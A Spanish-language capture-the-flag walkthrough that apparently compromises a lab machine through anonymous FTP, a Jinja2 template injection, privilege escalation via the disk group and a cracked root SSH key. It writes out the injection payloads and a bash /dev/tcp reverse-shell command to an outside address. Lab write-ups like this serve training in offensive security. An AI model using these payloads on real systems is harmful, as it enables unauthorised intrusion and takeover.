Escaneo de puertos:

![](../../../Images/Pasted%20image%2020240816165851.png)

Entremos por el puerto 21 FTP ya que tenemos acceso con el usuario anonymous sin proporcionar contraseña:

![](../../../Images/Pasted%20image%2020240816165949.png)

Tenemos un .txt, lo descargamos en nuestro kali y lo leemos:

![](../../../Images/Pasted%20image%2020240816170050.png)

Bruh :V una broma

Veamos el puerto 5000:

![](../../../Images/Pasted%20image%2020240816170212.png)

Tenemos la imagen de una máquina extractora de petróleo

Veamos su código fuente:

![](../../../Images/Pasted%20image%2020240816170249.png)

Tenemos una pista de un posible directorio, accedamos a el:

![](../../../Images/Pasted%20image%2020240816170350.png)

Tenemos un espacio como para escribir algo y ver lo que nos devuelve la página

Probemos con un comando como whoami para ver que sucede:

![](../../../Images/Pasted%20image%2020240816170435.png)

Efectivamente nos devuelve lo q escribimos

Probemos a ver si es vulnerable a una STTI (Server Side Template Injection):

![](../../../Images/Pasted%20image%2020240816170554.png)

![](../../../Images/Pasted%20image%2020240816170601.png)

Y si, efectivamente es vulnerable

Accederemos a la siguiente pagina y nos copiaremos este comando:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection

![](../../../Images/Pasted%20image%2020240814211729.png)

Lo pegamos con el comando whoami:
```
Hola{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

![](../../../Images/Pasted%20image%2020240816170744.png)

Detrás de la página está el usuario tcuser

Entonces ahora meteremos un comando de reverse shell y nos pondremos a la escucha con Netcat:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/192.168.1.232/443 0>&1"').read() }}
```

![](../../../Images/Pasted%20image%2020240816170840.png)

![](../../../Images/Pasted%20image%2020240816170856.png)

Y listo, estamos dentro de la máquina

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240816170932.png)

![](../../../Images/Pasted%20image%2020240816170952.png)

## ESCALADA DE PRIVILEGIOS

Veamos a los grupos a los que pertenecemos con el comando id

![](../../../Images/Pasted%20image%2020240816171753.png)

Nos llama la atención el grupo Disk

Investiguemos un poco. En la página Hacktricks encontré esta información:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe

![](../../../Images/Pasted%20image%2020240816172037.png)

La cual nos dice que este grupo es ser casi como un usuario root

Ejecutemos esos comandos:

![](../../../Images/Pasted%20image%2020240816172251.png)

Tenemos el id_rsa de root

Me lo paso a mi kali le extraemos la hash con Ssh2john y la crackeamos con John:

![](../../../Images/Pasted%20image%2020240816172606.png)

Y la contraseña para acceder con este id_rsa es angels1

Intrusión por el puerto 22 SSH con usuario root y con la id_rsa:

![](../../../Images/Pasted%20image%2020240816172718.png)

Y listo, ya somos ROOT

Flag de user:

![](../../../Images/Pasted%20image%2020240816172753.png)

Flag de root:

![](../../../Images/Pasted%20image%2020240816172805.png)

